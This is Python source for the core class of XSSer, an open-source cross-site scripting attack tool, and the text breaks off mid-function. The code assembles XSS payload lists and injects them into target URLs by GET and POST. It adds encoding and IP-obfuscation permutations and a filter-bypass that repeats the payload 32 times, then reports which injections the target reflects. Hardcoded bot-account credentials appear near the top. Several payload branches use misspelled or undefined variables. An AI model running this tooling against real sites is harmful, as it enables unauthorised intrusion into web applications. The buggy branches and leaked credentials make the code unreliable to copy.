#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
"""
$Id$

This file is part of the xsser project, http://xsser.sourceforge.net.

Copyright (c) 2011/2012 psy <root@lordepsylon.net> - <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os, re, sys, datetime, hashlib, time, urllib, cgi, traceback, webbrowser
import XSSer.fuzzing
import XSSer.fuzzing.vectors
import XSSer.fuzzing.DCP
import XSSer.fuzzing.DOM
import XSSer.fuzzing.HTTPsr
import XSSer.fuzzing.heuristic
from collections import defaultdict
from itertools import islice, chain
from XSSer.curlcontrol import Curl
from XSSer.encdec import EncoderDecoder
from XSSer.options import XSSerOptions
from XSSer.dork import Dorker
from XSSer.crawler import Crawler
from XSSer.post.shorter import ShortURLReservations
from XSSer.imagexss import ImageInjections
from XSSer.flashxss import FlashInjections
from XSSer.publish import publisher
from XSSer.post.xml_exporter import xml_reporting
from XSSer.tokenhub import HubThread
from XSSer.reporter import XSSerReporter
from XSSer.threadpool import ThreadPool, NoResultsPending

# set to emit debug messages about errors (0 = off).
DEBUG = 1

class xsser(EncoderDecoder, XSSerReporter):
    """
    XSSer application class
    """
    def __init__(self, mothership=None):
        self._reporter = None
        self._reporters = []
        self._landing = False
        self._ongoing_requests = 0
        self._oldcurl = []
        self._gtkdir = None
        self._webbrowser = webbrowser
        self.crawled_urls = []
        self.checked_urls = []
        self.successfull_urls = []
        self.urlmalformed = False

        # deploy your swarm (default: grey swarm!)"
        # this parameters are connected to the GTK interface (swarm tab)
        self.sn_service = 'https://identi.ca'
        self.sn_username = 'xsserbot01'
        self.sn_password = '8vnVw8wvs'
        self.sn_url = 'http://identi.ca/api/statuses/update.xml'

        if not mothership:
            # no mothership so *this* is the mothership
            # start the communications hub and rock on!
            self.hub = None
            self.pool = ThreadPool(0)
            self.mothership = None
            self.final_attacks = {}
        else:
            self.hub = None
            self.mothership = mothership
            self.mothership.add_reporter(self)
            self.pool = ThreadPool(0)
            self.final_attacks = self.mothership.final_attacks
            #self.pool = None

        # initialize the url encoder/decoder
        EncoderDecoder.__init__(self)
        # your unique real opponent
        self.time = datetime.datetime.now()

        # this payload comes with vector already..
        #self.DEFAULT_XSS_PAYLOAD = "<img src=x onerror=alert('XSS')>"
        self.DEFAULT_XSS_PAYLOAD = 'XSS'
        #self.DEFAULT_XSS_VECTOR = '">PAYLOAD'
        self.DEFAULT_XSS_VECTOR = ''

        # to be or not to be...
        self.hash_found = []
        self.hash_notfound = []

        # other hashes
        self.hashed_payload = []
        self.url_orig_hash = []

        # some counters for checker systems
        self.errors_isalive = 0
        self.next_isalive = False
        self.flag_isalive_num = 0
        #self.errors_jumper = 0
        #self.next_jumper = False
        
        # some controls about targets
        self.urlspoll = []

        # some statistics counters for connections
        self.success_connection = 0
        self.not_connection = 0
        self.forwarded_connection = 0
        self.other_connection = 0

	# some statistics counters for payloads
        self.xsr_injection = 0
        self.xsa_injection = 0
        self.coo_injection = 0
        self.manual_injection = 0
        self.auto_injection = 0
        self.dcp_injection = 0
        self.dom_injection = 0
        self.httpsr_injection = 0
        self.check_positives = 0
        
        # some statistics counters for injections founded
        self.xsr_founded = 0
        self.xsa_founded = 0
        self.coo_founded = 0
        self.manual_founded = 0
        self.auto_founded = 0
        self.dcp_founded = 0
        self.dom_founded = 0
        self.httpsr_founded = 0
        self.false_positives = 0

	# some statistics counters for heuristic parameters
        self.heuris_backslash_founded = 0
        self.heuris_une_backslash_founded = 0
        self.heuris_dec_backslash_founded = 0
        self.heuris_backslash_notfounded = 0
        self.heuris_slash_founded = 0
        self.heuris_une_slash_founded = 0
        self.heuris_dec_slash_founded = 0
        self.heuris_slash_notfounded = 0
        self.heuris_mayor_founded = 0
        self.heuris_une_mayor_founded = 0
        self.heuris_dec_mayor_founded = 0
        self.heuris_mayor_notfounded = 0
        self.heuris_minor_founded = 0
        self.heuris_une_minor_founded = 0
        self.heuris_dec_minor_founded = 0
        self.heuris_minor_notfounded = 0
        self.heuris_semicolon_founded = 0
        self.heuris_une_semicolon_founded = 0
        self.heuris_dec_semicolon_founded = 0
        self.heuris_semicolon_notfounded = 0
        self.heuris_colon_founded = 0
        self.heuris_une_colon_founded = 0
        self.heuris_dec_colon_founded = 0
        self.heuris_colon_notfounded = 0
        self.heuris_doublecolon_founded = 0
        self.heuris_une_doublecolon_founded = 0
        self.heuris_dec_doublecolon_founded = 0
        self.heuris_doublecolon_notfounded = 0
        self.heuris_equal_founded = 0
        self.heuris_une_equal_founded = 0
        self.heuris_dec_equal_founded = 0
        self.heuris_equal_notfounded = 0

        # xsser verbosity (0 - no output, 1 - dots only, 2+ - real verbosity)
        self.verbose = 2
        self.options = None

    def __del__(self):
        if not self._landing:
            self.land()

    def get_gtk_directory(self):
        if self._gtkdir:
            return self._gtkdir
        local_path = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                  'gtk')
        if os.path.exists(local_path):
            self._gtkdir = local_path
            return self._gtkdir
        elif os.path.exists('/usr/share/xsser/gtk'):
            self._gtkdir = '/usr/share/xsser/gtk'
            return self._gtkdir

    def set_webbrowser(self, browser):
        self._webbrowser = browser

    def set_reporter(self, reporter):
        self._reporter = reporter

    def add_reporter(self, reporter):
        self._reporters.append(reporter)

    def remove_reporter(self, reporter):
        if reporter in self._reporters:
            self._reporters.remove(reporter)

    def generate_hash(self, attack_type='default'):
        """
        generate a new hash for a type of attack.
        """
        return hashlib.md5(str(datetime.datetime.now()) + attack_type).hexdigest()

    def report(self, msg, level='info'):
        """
        Report some error from the application.

        levels: debug, info, warning, error
        """
        if self.verbose == 2:
            prefix = ""
            if level != 'info':
                prefix = "["+level+"] "
            print msg
        elif self.verbose:
            if level == 'error':
                sys.stdout.write("*")
            else:
                sys.stdout.write(".")
        for reporter in self._reporters:
            reporter.post(msg)
        if self._reporter:
            from twisted.internet import reactor
            reactor.callFromThread(self._reporter.post, msg)

    def set_options(self, options):
        """
        Set xsser options
        """
        self.options = options
        self._opt_request()

    def _opt_request(self):
        """
        Pass on some properties to Curl
        """
        options = self.options
        for opt in ['cookie', 'agent', 'referer',\
			'headers', 'atype', 'acred', 'acert',
			'proxy', 'ignoreproxy', 'timeout', 
                        'delay', 'tcp_nodelay', 'retries', 
                        'xforw', 'xclient', 'threads', 
                        'dropcookie', 'followred', 'fli',
                        'nohead', 'isalive', 'alt', 'altm',
                        'ald', 'jumper'
			]:
            if hasattr(options, opt) and getattr(options, opt):
                setattr(Curl, opt, getattr(options, opt))

    # attack functions
    def get_payloads(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        options = self.options
	# payloading sources
        payloads_fuzz = XSSer.fuzzing.vectors.vectors
        payloads_dcp = XSSer.fuzzing.DCP.DCPvectors
        payloads_dom = XSSer.fuzzing.DOM.DOMvectors
        payloads_httpsr = XSSer.fuzzing.HTTPsr.HTTPrs_vectors
        manual_payload = [{"payload":options.script, "browser":"[manual_injection]"}]
        # sustitute payload for hash to check false positives
        self.hashed_payload = self.generate_hash('url')
        checker_payload = [{"payload":self.hashed_payload, "browser":"[hashed_precheck_system]"}]
        # heuristic parameters
        heuristic_params = XSSer.fuzzing.heuristic.heuristic_test
        def enable_options_heuristic(payloads):
            if options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            return payloads
        if options.fuzz:
            payloads = payloads_fuzz
            if options.dcp:
                payloads = payloads + payloads_dcp
                if options.script:
                    payloads = payloads + manual_payload
                    if options.hash:
                        payloads = checker_payload + payloads
                        if options.inducedcode:
                            payloads = payloads + payloads_httpsr
                            if options.heuristic:
                                payloads = heuristic_params + payloads
                                if options.dom:
                                    payloads = payloads + payloads_dom
                    elif options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
                        elif options.dom:
                            payloads = payloads + payloads_dom
                    elif options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
                elif options.hash:
                    payloads = checker_payload + payloads
                    if options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
                        elif options.dom:
                            payloads = payloads + payloads_dom
                elif options.inducedcode:
                    payloads = payloads + payloads_httpsr
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
            elif options.script:
                payloads = payloads + manual_payload
                if options.hash:
                    payloads = checker_payload + payloads
                    if options.inducedcode:
                        payloads = payaloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
            elif options.hash:
                payloads = checker_payload + payloads
                if options.inducedcode:
                    payloads = payloads + payloads_httpsr
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
                elif options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
                elif options.dom:
                    payloads = payloads + payloads_dom
            elif options.inducedcode:
                payloads = payloads + payloads_httpsr
                if options.hash:
                    payloads = checker_payload + payloads
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
            
        elif options.dcp:
            payloads = payloads_dcp
            if options.script:
                payloads = payloads + manual_payload
                if options.hash:
                    payloads = checker_payload + payloads
                    if options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
            elif options.hash:
                payloads = checker_payload + payloads
                if options.inducedcode:
                    payloads = payloads + inducedcode
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
            elif options.inducedcode:
                payloads = payloads + payloads_httpsr
                if options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
                elif options.dom:
                    payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom

        elif options.script:
            payloads = manual_payload
            if options.hash:
                payloads = checker_payload + payloads
                if options.inducedcode:
                    payloads = payloads + payloads_httpsr
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
            elif options.inducedcode:
                payloads = payloads + payloads_httpsr
                if options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
                elif options.dom:
                    payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    paylaods = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.inducedcode:
            payloads = payloads_httpsr
            if options.hash:
                payloads = checker_payload + payloads
                if options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.heuristic:
            payloads = heuristic_params
            if options.hash:
                payloads = checker_payload + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.dom:
            payloads = payloads_dom

        elif not options.fuzz and not options.dcp and not options.script and not options.hash and not options.inducedcode and not options.heuristic and not options.dom:
            payloads = [{"payload":'">PAYLOAD',
			 "browser":"[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"
                         }]
        else:
            payloads = checker_payload

        return payloads

    def process_ipfuzzing(self, text):
        """
        Mask ips in given text to DWORD
        """
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipDwordEncode(ip)))
        return text

    def process_ipfuzzing_octal(self, text):
        """
       	Mask ips in given text to Octal
	    """
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipOctalEncode(ip)))
        return text

    def process_payloads_ipfuzzing(self, payloads):
        """
        Mask ips for all given payloads using DWORD
        """
        # ip fuzzing (DWORD)
        if self.options.Dwo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def process_payloads_ipfuzzing_octal(self, payloads):
        """
        Mask ips for all given payloads using OCTAL
        """
        # ip fuzzing (OCTAL)
        if self.options.Doo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing_octal(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def get_query_string(self):
        """
        Get the supplied query string.
        """
        if self.options.postdata:
            return self.options.postdata
        elif self.options.getdata:
            return self.options.getdata
        return ""

    def attack_url(self, url, payloads, query_string):
        """
        Attack the given url, checking or not, if is alive.
        """
        if self.options.nohead:
            for payload in payloads:
                self.attack_url_payload(url, payload, query_string)

        else:
            hc = Curl()
            try:
                urls = hc.do_head_check([url])
            except:
                print "Target url: (" + url + ") is malformed" + " [DISCARDED]" + "\n"
                return
            if str(hc.info()["http-code"]) in ["200", "302", "301", "401"]:
                if str(hc.info()["http-code"]) in ["301"]:
                    url = str(hc.info()["Location"])
                    payload = ""
                    query_string = ""
                elif str(hc.info()["http-code"]) in ["302"]:
                    url = url + "/"
                    payload = ""
                    query_string = ""

                print "\nHEAD alive check for the target: (" + url + ") is OK" + "(" + hc.info()["http-code"] + ") [AIMED]\n"
                self.success_connection = self.success_connection + 1
                for payload in payloads:
                    self.attack_url_payload(url, payload, query_string)
            else:
                print "\nHEAD alive check for the target: (" + url + ") is FAILED(" + hc.info()["http-code"] + ") [DISCARDED]" + "\n"
                self.not_connection = self.not_connection + 1

    def get_url_payload(self, url, payload, query_string, attack_payload=None):
        """
        Attack the given url with the given payload
        """
        options = self.options
        self._ongoing_attacks = {}

        # get payload/vector
        payload_string = payload['payload'].strip()
        
        # if PHPIDS (>0.6.5) exploit is invoked
        if options.phpids:
            payload_string = 32*payload_string + payload_string

        # substitute the attack hash
        url_orig_hash = self.generate_hash('url')
        payload_string = payload_string.replace('PAYLOAD', self.DEFAULT_XSS_PAYLOAD)
        hashed_payload = payload_string.replace('XSS', url_orig_hash)
        if attack_payload:
            # url for real attack
            hashed_vector_url = self.encoding_permutations(attack_payload)
        else:
            # test
            hashed_vector_url = self.encoding_permutations(hashed_payload)

        self._ongoing_attacks['url'] = url_orig_hash

        if 'VECTOR' in url:
            # this url comes with vector included
            dest_url = url.strip().replace('VECTOR', hashed_vector_url)
        else:
            payload_url = query_string.strip() + hashed_vector_url
            if not query_string and not url.strip().endswith("/"):
                dest_url = url.strip() + '/' + payload_url
            else:
                dest_url = url.strip() + payload_url
        return dest_url, url_orig_hash

    def attack_url_payload(self, url, payload, query_string):
        if not self.pool:
            pool = self.mothership.pool
        else:
            pool = self.pool
        c= Curl()
        def _cb(request, result):
            self.finish_attack_url_payload(c, request, result, payload,
                                           query_string, url, newhash)
        _error_cb = self.error_attack_url_payload
        def _error_cb(request, error):
            self.error_attack_url_payload(c, url, request, error)

        if self.options.getdata or not self.options.postdata:
            dest_url, newhash = self.get_url_payload(url, payload, query_string)
            #self.report(dest_url)
            self._prepare_extra_attacks()
            pool.addRequest(c.get, [dest_url], _cb, _error_cb)
            self._ongoing_requests += 1
            #c.get(dest_url)

        if self.options.postdata:
            dest_url, newhash = self.get_url_payload("", payload, query_string)
            dest_url = dest_url.strip().replace("/", "", 1)
            self.report("\nSending POST:", query_string, "\n")
            data = c.post(url, dest_url)
            self._prepare_extra_attacks()
            pool.addRequest(c.get, [dest_url], _cb, _error_cb)
            self._ongoing_requests += 1
            #c.post(url, dest_url)

    def error_attack_url_payload(self, c, url, request, error):
        self._ongoing_requests -= 1
        for reporter in self._reporters:
            reporter.mosquito_crashed(url, str(error[0]))
        dest_url = request.args[0]
        self.report("Failed attempt (URL Malformed!?): " + url + "\n")
        self.urlmalformed = True
        #self.report(self.urlmalformed)
        if self.urlmalformed == True and self.urlspoll[0] == url:
            self.land()
        self.report(str(error[0]))
        if DEBUG:
            traceback.print_tb(error[2])
        c.close()
        del c
        return

    def finish_attack_url_payload(self, c, request, result, payload,
                                  query_string, url, orig_hash):
        #if self.next_jumper == True:
        #    self.next_jumper = False
        #    return
        #else:
        self.report('='*75)
        self.report("Target: " + url + " --> " + str(self.time))
        self.report('='*75 + "\n")

        #self.report(self.urlspoll)

        self._ongoing_requests -= 1
        dest_url = request.args[0]
        #self.report(dest_url)

        # adding constant head check number flag
        if self.options.isalive:
            self.flag_isalive_num = int(self.options.isalive)

        if self.options.isalive <= 0:
            pass

        elif self.options.isalive and self.options.nohead:
            self.errors_isalive = self.errors_isalive + 1
            if self.errors_isalive > self.options.isalive:
                pass
            else:
                self.report("---------------------")
                self.report("Alive Checker for: " + url + " - [", self.errors_isalive, "/", self.options.isalive, "]\n")
            if self.next_isalive == True:
                hc = Curl()
                self.next_isalive = False
                try:
                    urls = hc.do_head_check([url])
                    #self.report(url)
                except:
                    print "Target url: (" + url + ") is unaccesible" + " [DISCARDED]" + "\n"
                    self.errors_isalive = 0
                    return
                if str(hc.info()["http-code"]) in ["200", "302", "301", "401"]:
                    print "HEAD alive check: OK" + "(" + hc.info()["http-code"] + ")\n"
                    print "- Your target still Alive: " + "(" + url + ")"
                    print "- If you are recieving continuous 404 errors requests on your injections, but your target is alive, is because:\n"
                    print "          - your injections are failing: totally normal :-)"
                    print "          - maybe exists some IPS/NIDS/... systems blocking your requests\n"
                else:
                    if str(hc.info()["http-code"]) == "0":
                        print "\nTarget url: (" + url + ") is unaccesible" + " [DISCARDED]" + "\n"
                    else:
                        print "HEAD alive check: FAILED" + "(" + hc.info()["http-code"] + ")\n"
                        print "- Your target " + "(" + url + ")" + " looks that is NOT alive"
                        print "- If you are recieving continuous 404 errors requests on payloads\n  and this HEAD pre-check request is giving you another 404\n  maybe is because; target is down, url malformed, something is blocking you...\n- If you haven't more than one target, try to; STOP THIS TEST!!\n"
                self.errors_isalive = 0
            else:
                if str(self.errors_isalive) >= str(self.options.isalive):
                    self.report("---------------------")
                    self.report("\nAlive System: XSSer is checking if your target still alive. [Response is comming...]\n")
                    self.next_isalive = True
                    self.options.isalive = self.flag_isalive_num
        else:
            if self.options.isalive and not self.options.nohead:
                self.report("---------------------")
                self.report("Alive System DISABLED!: XSSer is using a pre-check HEAD request per target by default, to perform better accurance on tests\nIt will check if target is alive before inject all the payloads. try (--no-head) with (--alive <num>) to control this checker limit manually")
                self.report("---------------------")

        # check results an alternative url, choosing method and parameters, or not
        if self.options.altm == None or self.options.altm not in ["GET", "POST", "post"]:
            self.options.altm = "GET"
        if self.options.altm == "post":
            self.options.altm = "POST"
        if self.options.alt == None:
            pass
        else:
            self.report("="*45)
            self.report("[+] Checking Response Options:", "\n")
            self.report("[+] Url:", self.options.alt)
            self.report("[-] Method:", self.options.altm)
            if self.options.ald:
                self.report("[-] Parameter(s):", self.options.ald, "\n")
            else:
                self.report("[-] Parameter(s):", query_string, "\n")

        # perform normal injection
        if c.info()["http-code"] in ["200", "302", "301"]:
            if self.options.statistics:
                self.success_connection = self.success_connection + 1
            self._report_attack_success(c, dest_url, payload,
                                        query_string, url, orig_hash)
        else:
            self._report_attack_failure(c, dest_url, payload,
                                        query_string, url, orig_hash)

        # checking response results 
        if self.options.alt == None:
            pass
        else:
            self.report("="*45)
            self.report("[+] Checking Response Results:", "\n")
            self.report("Searching using", self.options.altm, "for:", orig_hash, "on alternative url")
            if 'PAYLOAD' in payload['payload']:
                user_attack_payload = payload['payload'].replace('PAYLOAD', orig_hash)
            if self.options.ald:
                query_string = self.options.ald

            if "VECTOR" in self.options.alt:
                dest_url = self.options.alt
            else:
                if not dest_url.endswith("/"):
                    dest_url = dest_url + "/"
            
            if self.options.altm == 'POST':
                dest_url = "" + query_string + user_attack_payload
                dest_url = dest_url.strip().replace("/", "", 1)
                data = c.post(url, dest_url)
                self._prepare_extra_attacks()
                #c.post(url, dest_url)
            else:
                dest_url = self.options.alt + query_string + user_attack_payload
                c.get(dest_url)
            
            #if self.options.verbose:
            #    self.report(str(c.info()))
            #    self.report(str(c.body()))

        # perform check response injection
            if c.info()["http-code"] in ["200", "302", "301"]:
                if self.options.statistics:
                    self.success_connection = self.success_connection + 1
                self._report_attack_success(c, dest_url, payload,
                                            query_string, url, orig_hash)
            else:
                self._report_attack_failure(c, dest_url, payload,
                                            query_string, url, orig_hash)
 
        c.close()
        del c

        # jumper system
        #if self.options.jumper <= 0:
        #    pass
                
        #elif self.options.jumper:
        #    if self.options.jumper == 1:
        #        self.report("This spell with 1 jumper requires special threading methods. Poll correctly reordered!?")
        #    self.errors_jumper = self.errors_jumper + 1
        #    if self.errors_jumper > self.options.jumper:
        #        pass
        #    else:
        #        self.report("---------------------")
        #        self.report("Jumps Checker for: " + url + " - [", self.errors_jumper, "/", self.options.jumper,  "]\n")
        #    if self.next_jumper == True:
        #        try:
        #            del self.urlspoll[0]
        #            self.report("Next target: [Ready!]")
        #            self.next_jumper = False
        #            self.errors_jumper = 0
        #        except:
        #            self.report("Next target: [Not Found!]... [Finishing test]")
        #            self.land()
        #    else:
        #        if self.errors_jumper >= self.options.jumper:
        #            self.report("---------------------")
        #            self.report("[Jumping...]\n")
        #            self.next_jumper = True
        #            self.errors_jumper = 0
        #            if self.urlspoll[0] == url:
        #                self.land()

    def encoding_permutations(self, enpayload_url):
        """
        Perform encoding permutations on the url and query_string.
        """
        options = self.options
        if options.Cem: 
            enc_perm = options.Cem.split(",")
            for _enc in enc_perm:
                enpayload_url   = self.encmap[_enc](enpayload_url)
        else: 
            for enctype in self.encmap.keys():
                if getattr(options, enctype):
                    enpayload_url   = self.encmap[enctype](enpayload_url)
        return enpayload_url

    def _report_attack_success(self, curl_handle, dest_url, payload,\
                               query_string, orig_url, url_orig_hash):
        """
        report success of an attack
        """
        if not orig_url in self.successfull_urls:
            self.successfull_urls.append(orig_url)
        options = self.options
        self.report("-"*45)
        if payload['browser'] == "[hashed_precheck_system]" or payload['browser'] == "[manual_injection]" or payload['browser'] == "[Heuristic test]":
            pass
        else:
            self.report("[-] Hashing: " + url_orig_hash)
        if payload['browser'] == "[Heuristic test]":
            self.report("[+] Checking: " + str(payload['payload']).strip('XSS'))
        else:
            self.report("[+] Trying: " + dest_url.strip())
        if payload['browser'] == "[Heuristic test]" or payload['browser'] == "[hashed_precheck_system]" or payload['browser'] == "[manual_injection]":
            pass
        else:
            self.report("[+] Browser Support: " + payload['browser'])
        
	# statistics injections counters
        if payload['browser']=="[hashed_precheck_system]" or payload['browser']=="[Heuristic test]":
            self.check_positives = self.check_positives + 1
        elif payload['browser']=="[Data Control Protocol Injection]":
            self.dcp_injection = self.dcp_injection + 1
        elif payload['browser']=="[Document Object Model Injection]":
            self.dom_injection = self.dom_injection + 1
        elif payload['browser']=="[Induced Injection]":
            self.httpsr_injection = self.httpsr_injection + 1
        elif payload['browser']=="[manual_injection]":
            self.manual_injection = self.manual_injection + 1
        else:
            self.auto_injection = self.auto_injection +1

        if options.verbose:
            self.report("[-] Headers Results:\n")
            self.report(curl_handle.info())
            # if you need more data about your connection(s), uncomment this two lines:
            #self.report("[-] Body Results:\n")
            #self.report(curl_handle.body())
            self.report("-"*45)
        
            if payload['browser']=="[Heuristic test]":
                pass
            else:
                self.report("[-] Injection Results:")

        # check attacks success
        for attack_type in self._ongoing_attacks:
            #hashing = self._ongoing_attacks[attack_type]
            hashing = url_orig_hash
            # checking heuristic responses
            if payload['browser']=="[Heuristic test]":
                heuristic_param = str(payload['payload']).strip('XSS')
                heuristic_string = str(hashing)
                if heuristic_string in curl_handle.body():
                    # ascii
                    if heuristic_param == "\\":
                        self.heuris_backslash_founded = self.heuris_backslash_founded + 1
                    # / is the same on ASCII and Unicode
                    elif heuristic_param == "/":
                        self.heuris_slash_founded = self.heuris_slash_founded + 1
                        self.heuris_une_slash_founded = self.heuris_une_slash_founded + 1
                    elif heuristic_param == ">":
                        self.heuris_mayor_founded = self.heuris_mayor_founded + 1
                    elif heuristic_param == "<":
                        self.heuris_minor_founded = self.heuris_minor_founded + 1
                    elif heuristic_param == ";":
                        self.heuris_semicolon_founded = self.heuris_semicolon_founded + 1
                    elif heuristic_param == "'":
                        self.heuris_colon_founded = self.heuris_colon_founded + 1
                    elif heuristic_param == '"':
                        self.heuris_doublecolon_founded = self.heuris_doublecolon_founded + 1
                    elif heuristic_param == "=":
                        self.heuris_equal_founded = self.heuris_equal_founded + 1
                    # une
                    elif heuristic_param == "%5C":
                        self.heuris_une_backslash_founded = self.heuris_une_backslash_founded + 1
                    elif heuristic_param == "%3E":
                        self.heuris_une_mayor_founded = self.heuris_une_mayor_founded + 1
                    elif heuristic_param == "%3C":
                        self.heuris_une_minor_founded = self.heuris_une_minor_founded + 1
                    elif heuristic_param == "%3B":
                        self.heuris_une_semicolon_founded = self.heuris_une_semicolon_founded + 1
                    elif heuristic_param == "%27":
                        self.heuris_une_colon_founded = self.heuris_une_colon_founded + 1
                    elif heuristic_param == "%22":
                        self.heuris_une_doublecolon_founded = self.heuris_une_doublecolon_founded + 1
                    elif heuristic_param == "%3D":
                        self.heuris_une_equal_founded = self.heuris_une_equal_founded + 1
                    # dec
                    elif heuristic_param == "&#92":
                        self.heuris_dec_backslash_founded = self.heuris_dec_backslash_founded + 1
                    elif heuristic_param == "&#47":
                        self.heuris_dec_slash_founded = self.heuris_dec_slash_founded + 1
                    elif heuristic_param == "&#62":
                        self.heuris_dec_mayor_founded = self.heuris_dec_mayor_founded + 1
                    elif heuristic_param == "&#60":
                        self.heuris_dec_minor_founded = self.heuris_dec_minor_founded + 1
                    elif heuristic_param == "&#59":
                        self.heuris_dec_semicolon_founded = self.heuris_dec_semicolon_founded + 1
                    elif heuristic_param == "&#39":
                        self.heuris_dec_colon_founded = self.heuris_dec_colon_founded + 1
                    elif heuristic_param == "&#34":
                        self.heuris_dec_doublecolon_founded = self.heuris_dec_doublecolon_founded + 1
                    elif heuristic_param == "&#61":
                        self.heuris_dec_equal_founded = self.heuris_dec_equal_founded + 1
	
                    self.add_success(dest_url, payload, hashing, query_string, orig_url, attack_type)
                else:
                    if heuristic_param == "\\":
                        self.heuris_backslash_notfounded = self.heuris_backslash_notfounded + 1
                    elif heuristic_param == "/":
                        self.heuris_slash_notfounded = self.heuris_slash_notfounded + 1
                    elif heuristic_param == ">":
                        self.heuris_mayor_notfounded = self.heuris_mayor_notfounded + 1
                    elif heuristic_param == "<":
                        self.heuris_minor_notfounded = self.heuris_minor_notfounded + 1
                    elif heuristic_param == ";":
                        self.heuris_semicolon_notfounded = self.heuris_semicolon_notfounded + 1
                    elif heuristic_param == "'":
                        self.heuris_colon_notfounded = self.heuris_colon_notfounded + 1
                    elif heuristic_param == '"':
                        self.heuris_doublecolon_notfounded = self.heuris_doublecolon_notfounded + 1
                    elif heuristic_param == "=":
                        self.heuris_equal_notfounded = self.heuris_equal_notfounded + 1
            else:
                # only add a success if hashing is on body, and we have a 200 OK http code response
                if hashing in curl_handle.body() and str(curl_handle.info()["http-code"]) == "200":
                    # some anti false positives manual checkers
                    if 'PAYLOAD' in payload['payload']:
                        user_attack_payload = payload['payload'].replace('PAYLOAD', url_orig_hash)
                        if str('/&gt;' + hashing) in curl_handle.body() or str('href=' + dest_url + hashing) in curl_handle.body() or str('content=' + dest_url + hashing) in curl_handle.body():
                            #self.report("FAILED: default")
                            #self.report(user_attack_payload)
                            self.add_failure(dest_url, payload, hashing, query_string, attack_type)
                        else:
                            #self.report("VULNERABLE")
                            self.add_success(dest_url, payload, hashing, query_string, orig_url, attack_type)
                else:
                    #self.report("FAILED: not valid request")
                    self.add_failure(dest_url, payload, hashing, query_string, attack_type)

    def add_failure(self, dest_url, payload, hashing, query_string, method='url'):
        """
        Add an attack that failed to inject
        """
        if payload['browser'] == "[Heuristic test]":
            pass
        else:
            self.report("[+] Checking: " + method + " attack with " + payload['payload'] + "... fail\n")
        options = self.options
        for reporter in self._reporters:
            reporter.add_failure(dest_url)
        if options.script:
            self.hash_notfound.append((dest_url, "Manual injection", method, hashing))
        else:
            self.hash_notfound.append((dest_url, payload['browser'], method, hashing))
        if options.verbose:
            self.report("Searching hash: " + hashing + " in target source code...\n")
            self.report("Injection failed!\n")

    def add_success(self, dest_url, payload, hashing, query_string, orig_url, method='url'):
        """
        Add an attack that managed to inject the code
        """
        if payload['browser'] == "[manual_injection]":
            self.report("[+] Checking: " + method + " attack with " + payload['payload'].strip() + "... ok\n")
        elif payload['browser'] == "[Heuristic test]":
            pass
        else:
